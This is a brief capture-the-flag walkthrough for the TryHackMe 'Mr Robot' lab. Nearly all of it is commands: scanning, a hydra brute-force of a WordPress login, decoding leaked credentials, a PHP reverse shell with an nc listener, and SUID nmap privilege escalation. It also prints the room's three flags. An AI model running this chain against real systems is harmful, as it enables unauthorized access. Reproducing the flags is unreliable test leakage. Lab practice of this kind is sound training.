# <div align="center">[Mr Robot CTF](https://tryhackme.com/r/room/mrrobot)</div>
<div align="center">
<img src="https://github.com/user-attachments/assets/0b4d4b9c-feba-48dc-8665-347ffd05967b" height="200"></img>
</div>

```
nmap -sC -sV -Pn <IP>
gobuster dir --url http://<IP>/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
http://<IP>/robots.txt
cat robots.txt
cat password.raw-md5
# abcdefghijklmnopqrstuvwxyz
su robot
cat key-1-of-3.txt
```
### Key 1
```
073403c8a58a1f80d943455fb30724b9
```
### Key 2
```
http://<IP>/wp-login.php
hydra -L fsocity.dic -p 123453453 {IP} http-post-form “/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username”
http://<IP>/license
echo "ZWxsaW90OkVSMjgtMDY1Mgo=" | base64 -d
# elliot:ER28–0652
https://github.com/pentestmonkey/php-reverse-shell
nc -lnvp 4444
python -c ‘import pty;pty.spawn(“/bin/bash”)’
cat /home/robot/key-2-of-3.txt
```
```
822c73956184f694993bede3eb39f959
```
### Key 2
```
sudo -l
find / -perm -u=s -type f 2>/dev/null
nmap --interactive
!sh
cat key-3-of-3.txt
```
```
04787ddef27c3dee1ee161b21670b4e4
```
